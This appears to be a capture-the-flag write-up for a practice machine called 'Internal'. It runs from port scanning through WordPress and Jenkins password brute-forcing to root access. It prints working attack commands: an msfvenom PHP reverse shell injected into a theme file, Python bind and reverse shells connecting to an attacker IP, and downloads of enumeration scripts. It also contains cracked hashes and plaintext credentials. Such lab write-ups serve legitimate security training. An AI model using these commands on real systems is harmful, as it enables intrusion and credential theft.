# Internal
## Table of Contents
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
  * [Web Browsing](#web-browsing)
  * [Web Crawling](#web-crawling)
  * [Vulnerability Scanning](#vulnerability-scanning)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing)
  * [Local File Inclusion](#local-file-inclusion)
* [Explore](#explore)
* [Escalate](#escalate)

## Enumerate
### Ports
An initial Nmap port scan discovered TCP ports 22 and 80 were open.
```bash
sudo nmap 10.10.22.113 -sS -sU --min-rate 1000 -oA internal-openports-initial

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 05:10 MDT
Nmap scan report for 10.10.59.65
Host is up (0.21s latency).
Not shown: 1006 closed ports, 992 open|filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.90 seconds
```

A scan of all TCP and UDP ports did not produce any additional information. 
```bash
sudo nmap 10.10.22.113 -sS -sU -p- --min-rate 1000 -oA template-openports-complete

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 05:14 MDT
Warning: 10.10.59.65 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.59.65
Host is up (0.21s latency).
Not shown: 66254 closed ports, 64814 open|filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 786.01 seconds
```

### Services
Nmap determined the target is running the following service versions:
* OpenSSH 7.6p1
* Apache 2.4.29

```bash
sudo nmap 10.10.22.113 -sS -sU -p T:22,80 -sV -oA internal-serviceversions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 05:12 MDT
Nmap scan report for 10.10.59.65
Host is up (0.21s latency).

PORT   STATE  SERVICE      VERSION
22/tcp open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
```

### Web Browsing
Discovered an Apache landing page. 
```bash
firefox http://10.10.59.65
```

### Web Crawling
Dirsearch discovered several web files and directories of interest. 
```bash
dirsearch.py -u 10.10.59.65 --simple-report internal-webcrawl.txt

# output
[05:28:06] 301 -  309B  - /blog  ->  http://10.10.59.65/blog/                                                     
[05:28:09] 200 -    4KB - /blog/wp-login.php                                                        
[05:28:10] 200 -   53KB - /blog/                           
[05:28:21] 200 -   11KB - /index.html                                                                          
[05:28:22] 301 -  315B  - /javascript  ->  http://10.10.59.65/javascript/
[05:28:32] 200 -   13KB - /phpmyadmin/doc/html/index.html                                               
[05:28:32] 301 -  315B  - /phpmyadmin  ->  http://10.10.59.65/phpmyadmin/
[05:28:35] 200 -   10KB - /phpmyadmin/                                                         
[05:28:35] 200 -   10KB - /phpmyadmin/index.php
[05:28:49] 200 -    4KB - /wordpress/wp-login.php  
```

### Vulnerability Scanning
Nikto
```bash
nikto -h 10.10.59.65 -Format txt -o internal-vulnscan-web.txt

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.59.65
+ Target Hostname:    10.10.59.65
+ Target Port:        80
+ Start Time:         2021-04-20 05:35:17 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5abef58e962a5, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ Cookie wordpress_test_cookie created without the httponly flag
+ /blog/wp-login.php: Wordpress login found
+ 8041 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2021-04-20 06:05:44 (GMT-6) (1827 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Exploit
### Password Guessing
```bash
hydra -l aubreanna -P /usr/share/wordlists/rockyou.txt internal.thm -t4 ssh
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.59.65 http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=0:Error"

# output
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-20 06:35:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.59.65:80/blog/wp-login.php?:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=0:Error
[STATUS] 815.00 tries/min, 815 tries in 00:01h, 14343584 to do in 293:20h, 16 active
[STATUS] 814.00 tries/min, 2442 tries in 00:03h, 14341957 to do in 293:40h, 16 active
[80][http-post-form] host: 10.10.59.65   login: admin   password: my2boys
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-20 06:39:52
```

```bash
firefox http://internal.thm/blog/wp-admin/post.php?post=1&action=edit

# output
Welcome to WordPress. This is your first post. Edit or delete it, then start writing!
```

```bash
firefox http://internal.thm/blog/wp-admin/post.php?post=5&action=edit

# output 
Don't forget to reset Will's credentials. william:arnold147
```

```bash
msfvenom -p php/reverse_php LHOST=10.2.76.52 LPORT=443 -f raw -o shell.php
```

PHP Reverse Shell
```bash
# on the attacker side
sudo nc -nvlp
firefox http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen
# replaced the original theme by copying and pasting the contents of shell.php
firefox http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

```
# on the victim side, via the PHP reverse shell
whoami

# output
www-data
```

```bash
# on the victim side
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# from the attacker side
nc 10.10.202.211 4444

# on the victim side
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
```

## Explore
```bash
cat /etc/passwd | grep -v "nologin" | grep -v "false"

# output
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
```

```bash
ps aux | grep aubre

# output
aubrean+  1424  0.0  0.0   1148     4 ?        Ss   00:36   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
aubrean+  1470  3.0 12.2 2588384 249044 ?      Sl   00:36   0:26 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
aubrean+  1483  0.0  0.0      0     0 ?        Z    00:36   0:00 [jenkins.sh] <defunct>
www-data  1999  0.0  0.0  11464  1108 pts/1    S+   00:50   0:00 grep aubre
```

```bash
cd /var/www/html/wordpress
grep -i 'password' *
cat wp-config.php # found username 'wordpress' with password 'wordpress123'
mysql -u wordpress -p
# password: wordpress123
```

```bash
SHOW databases;
USE wordpress;
SELECT table_name FROM information_schema.tables;
SELECT * FROM wp_users;

# output
admin | $P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/
```

```bash
echo '$P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# output
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
my2boys          (?)
1g 0:00:00:04 DONE (2021-04-20 21:32) 0.2155g/s 868.9p/s 868.9c/s 868.9C/s cheska..pokpok
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```

```bash
cd /opt
cat ./wp-save.txt

# output
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
su aubreanna # password above worked
```

## Escalate
```bash
# send all external traffic destined for 5050 to port 8080 (open on loopback)
mkfifo backpipe
nc -l 5050 0<backpipe | nc localhost 8080 1>backpipe
```

```bash
wget http://10.2.76.52:443/linenum.sh 
chmod +x linenum.sh > /tmp/linenum.sh
/tmp/linenum.sh > /tmp/enum.txt
cat /tmp/enum.txt

# output
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:34123         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
```

```bash
wget http://10.2.76.52:443/linpeas.sh 
chmod +x linpeas.sh > /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/peas.txt
cat /tmp/peas.txt

# output
phpmyadmin
B2Ud4fEOZmVq
```

```bash
# on the victim side
curl localhost:34123 # no valuable output
curl localhost:8080 # indicated a login form
ssh -R 8080:localhost:8080 victor@10.2.76.52

# on the attacker side
firefox http://localhost:8080
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2FsecurityRealm%2F&Submit=Sign+in:Invalid:H=Cookie: JSESSIONID.c183fa3f=node094zlgqyyu9bv1udusqwigioku1.node0; JSESSIONID.2361f2d8=node036zz91zwxct618x9ihzi8d2pz0.node0"

hydra -l aubreanna -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2FsecurityRealm%2F&Submit=Sign+in:Invalid:H=Cookie: JSESSIONID.c183fa3f=node094zlgqyyu9bv1udusqwigioku1.node0; JSESSIONID.2361f2d8=node036zz91zwxct618x9ihzi8d2pz0.node0"
```

```bash
cd /home/aubreanna/
cat jenkins.txt

# output
Internal Jenkins service is running on 172.17.0.2:8080
```

```bash
id 

# output
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2FsecurityRealm%2F&Submit=Sign+in:Invalid"

# output
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-21 22:04:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2FsecurityRealm%2F&Submit=Sign+in:Invalid
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-21 22:04:59
```

```bash
# create, configure, and build a new project (execute shell)

export RHOST="10.2.76.52";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```bash
cat /opt/note.txt

# output
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

```bash
ssh root@internal.thm
cat /root/root.txt
```
